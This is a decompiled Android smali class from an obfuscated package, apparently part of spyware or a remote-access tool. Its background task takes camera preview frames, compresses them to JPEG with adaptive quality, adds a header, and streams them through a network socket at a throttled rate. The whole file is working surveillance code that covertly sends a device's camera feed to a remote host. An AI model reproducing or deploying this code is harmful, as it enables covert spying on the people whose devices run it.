.class Lcmf0/c3b5bm90zq/patch/C5$a;
.super Landroid/os/AsyncTask;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcmf0/c3b5bm90zq/patch/C5;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "a"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/Object;",
        "Ljava/lang/Integer;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field final synthetic a:Lcmf0/c3b5bm90zq/patch/C5;


# direct methods
.method private constructor <init>(Lcmf0/c3b5bm90zq/patch/C5;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcmf0/c3b5bm90zq/patch/C5;Lcmf0/c3b5bm90zq/patch/C5$1;)V
    .locals 0

    invoke-direct {p0, p1}, Lcmf0/c3b5bm90zq/patch/C5$a;-><init>(Lcmf0/c3b5bm90zq/patch/C5;)V

    return-void
.end method


# virtual methods
.method protected varargs a([Ljava/lang/Object;)Ljava/lang/String;
    .locals 12

    :cond_0
    :goto_0
    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->g(Lcmf0/c3b5bm90zq/patch/C5;)Z

    move-result p1

    if-eqz p1, :cond_12

    :try_start_0
    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->e(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    if-lez p1, :cond_0

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->f(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    if-lez p1, :cond_0

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->f(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    const/4 v0, 0x0

    invoke-interface {p1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Ljava/lang/Long;

    invoke-virtual {p1}, Ljava/lang/Long;->longValue()J

    move-result-wide v1

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->e(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, [B

    check-cast p1, [B

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v3}, Lcmf0/c3b5bm90zq/patch/C5;->c(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v3

    cmp-long v5, v3, v1

    if-nez v5, :cond_f

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    const-wide/16 v4, 0x53

    const-wide/16 v6, 0x45

    if-eqz v3, :cond_e

    sget-object v3, Lcmf0/c3b5bm90zq/patch/C5;->a:Landroid/hardware/Camera;

    invoke-virtual {v3}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v3

    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v8

    iget v9, v8, Landroid/hardware/Camera$Size;->width:I

    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v3

    iget v10, v3, Landroid/hardware/Camera$Size;->height:I

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v3

    if-eqz v3, :cond_d

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    iget-boolean v3, v3, Lcmf0/c3b5bm90zq/patch/C5;->l:Z

    const/4 v8, 0x1

    if-ne v3, v8, :cond_c

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v3}, Lcmf0/c3b5bm90zq/patch/C5;->b(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/io/OutputStream;

    move-result-object v3

    if-eqz v3, :cond_b

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-static {v3, v4, v5}, Lcmf0/c3b5bm90zq/patch/C5;->b(Lcmf0/c3b5bm90zq/patch/C5;J)J

    new-instance v11, Landroid/graphics/YuvImage;

    const/16 v5, 0x11

    const/4 v8, 0x0

    move-object v3, v11

    move-object v4, p1

    move v6, v9

    move v7, v10

    invoke-direct/range {v3 .. v8}, Landroid/graphics/YuvImage;-><init>([BIII[I)V

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    array-length p1, p1

    invoke-direct {v3, p1}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    new-instance p1, Landroid/graphics/Rect;

    invoke-direct {p1, v0, v0, v9, v10}, Landroid/graphics/Rect;-><init>(IIII)V

    sget v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    invoke-virtual {v11, p1, v4, v3}, Landroid/graphics/YuvImage;->compressToJpeg(Landroid/graphics/Rect;ILjava/io/OutputStream;)Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->h(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v6

    const/4 p1, 0x0

    sub-long/2addr v4, v6

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->i(Lcmf0/c3b5bm90zq/patch/C5;)I

    move-result p1

    int-to-long v6, p1

    cmp-long p1, v4, v6

    if-gez p1, :cond_a

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->size()I

    move-result p1

    sget v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    const/16 v5, 0x47

    if-ne v4, v5, :cond_6

    const v4, 0xf000

    if-le p1, v4, :cond_1

    const/16 v4, 0xa

    sput v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    goto :goto_1

    :cond_1
    const v4, 0xc800

    if-le p1, v4, :cond_2

    const/16 v4, 0x14

    sput v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    goto :goto_1

    :cond_2
    const v4, 0xa000

    if-le p1, v4, :cond_3

    const/16 v4, 0x1e

    sput v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    goto :goto_1

    :cond_3
    const/16 v4, 0x7800

    if-le p1, v4, :cond_4

    const/16 v4, 0x28

    sput v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    goto :goto_1

    :cond_4
    const/16 v4, 0x5000

    if-le p1, v4, :cond_5

    const/16 v4, 0x32

    sput v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    goto :goto_1

    :cond_5
    const/16 v4, 0x2800

    if-le p1, v4, :cond_6

    const/16 v4, 0x3c

    sput v4, Lcmf0/c3b5bm90zq/patch/C5;->g:I

    :cond_6
    :goto_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v5, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v7, 0x47

    invoke-static {v5, v6, v7, v8}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->e:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    array-length v5, v5

    add-int/2addr v5, p1

    invoke-direct {v4, v5}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->h(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v7

    const/4 p1, 0x0

    sub-long/2addr v5, v7

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->i(Lcmf0/c3b5bm90zq/patch/C5;)I

    move-result p1

    int-to-long v7, p1

    cmp-long p1, v5, v7

    if-gez p1, :cond_9

    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->size()I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    array-length v1, v1

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    array-length v5, v5

    add-int/2addr v1, v5

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->size()I

    move-result v5

    add-int/2addr v1, v5

    invoke-direct {p1, v1}, Ljava/io/ByteArrayOutputStream;-><init>(I)V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->size()I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v5}, Lcmf0/c3b5bm90zq/patch/C5;->h(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v5

    const/4 v7, 0x0

    sub-long/2addr v1, v5

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v5}, Lcmf0/c3b5bm90zq/patch/C5;->i(Lcmf0/c3b5bm90zq/patch/C5;)I

    move-result v5

    int-to-long v5, v5

    cmp-long v7, v1, v5

    if-gez v7, :cond_8

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->e()Ljava/lang/Object;

    move-result-object v1

    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    :try_start_1
    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C5;->b(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/io/OutputStream;

    move-result-object v2

    if-eqz v2, :cond_7

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v2

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    array-length v5, v5

    mul-int/lit8 v5, v5, 0xf

    invoke-virtual {v2, v5}, Ljava/net/Socket;->setSendBufferSize(I)V

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C5;->d()Ljava/net/Socket;

    move-result-object v5

    invoke-virtual {v5}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    invoke-static {v2, v5}, Lcmf0/c3b5bm90zq/patch/C5;->a(Lcmf0/c3b5bm90zq/patch/C5;Ljava/io/OutputStream;)Ljava/io/OutputStream;

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C5;->b(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/io/OutputStream;

    move-result-object v2

    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/io/OutputStream;->write([B)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C5;->h(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v7

    const/4 v2, 0x0

    sub-long/2addr v5, v7

    iget-object v2, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C5;->i(Lcmf0/c3b5bm90zq/patch/C5;)I

    move-result v2

    int-to-long v7, v2

    cmp-long v2, v5, v7

    if-gez v2, :cond_7

    long-to-int v2, v5

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v5}, Lcmf0/c3b5bm90zq/patch/C5;->i(Lcmf0/c3b5bm90zq/patch/C5;)I

    move-result v5

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    sub-int/2addr v5, v2

    int-to-long v5, v5

    :try_start_2
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    :catch_0
    :cond_7
    :try_start_3
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    :catch_1
    :try_start_4
    monitor-exit v1

    goto/16 :goto_3

    :catchall_0
    move-exception p1

    monitor-exit v1
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :try_start_5
    throw p1
    :try_end_5
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :cond_8
    :try_start_6
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->close()V

    goto/16 :goto_3

    :cond_9
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->close()V

    goto/16 :goto_3

    :cond_a
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_3

    goto/16 :goto_3

    :cond_b
    :try_start_7
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v6, v7}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "outputStream =null"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    :goto_2
    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    goto/16 :goto_3

    :cond_c
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v6, v7}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "ctd =false"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_2

    :cond_d
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v6, v7}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "socket =null"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_2

    :cond_e
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v6, v7}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "camera =null"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v1, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v1, v2, v4, v5}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto/16 :goto_2

    :catch_2
    :cond_f
    :goto_3
    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->e(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    if-lez p1, :cond_10

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->e(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1, v0}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    :cond_10
    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->f(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/List;->size()I

    move-result p1

    if-lez p1, :cond_11

    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {p1}, Lcmf0/c3b5bm90zq/patch/C5;->f(Lcmf0/c3b5bm90zq/patch/C5;)Ljava/util/List;

    move-result-object p1

    invoke-interface {p1, v0}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    :cond_11
    iget-object p1, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C5$a;->a:Lcmf0/c3b5bm90zq/patch/C5;

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C5;->c(Lcmf0/c3b5bm90zq/patch/C5;)J

    move-result-wide v0

    const-wide/16 v2, 0x1

    add-long/2addr v0, v2

    invoke-static {p1, v0, v1}, Lcmf0/c3b5bm90zq/patch/C5;->c(Lcmf0/c3b5bm90zq/patch/C5;J)J
    :try_end_7
    .catch Ljava/lang/OutOfMemoryError; {:try_start_7 .. :try_end_7} :catch_3
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto/16 :goto_0

    :catch_3
    nop

    goto/16 :goto_0

    :cond_12
    const-string p1, "-->"

    return-object p1
.end method

.method protected a(Ljava/lang/String;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    return-void
.end method

.method protected varargs a([Ljava/lang/Integer;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onProgressUpdate([Ljava/lang/Object;)V

    return-void
.end method

.method protected synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    invoke-virtual {p0, p1}, Lcmf0/c3b5bm90zq/patch/C5$a;->a([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcmf0/c3b5bm90zq/patch/C5$a;->a(Ljava/lang/String;)V

    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    return-void
.end method

.method protected synthetic onProgressUpdate([Ljava/lang/Object;)V
    .locals 0

    check-cast p1, [Ljava/lang/Integer;

    invoke-virtual {p0, p1}, Lcmf0/c3b5bm90zq/patch/C5$a;->a([Ljava/lang/Integer;)V

    return-void
.end method
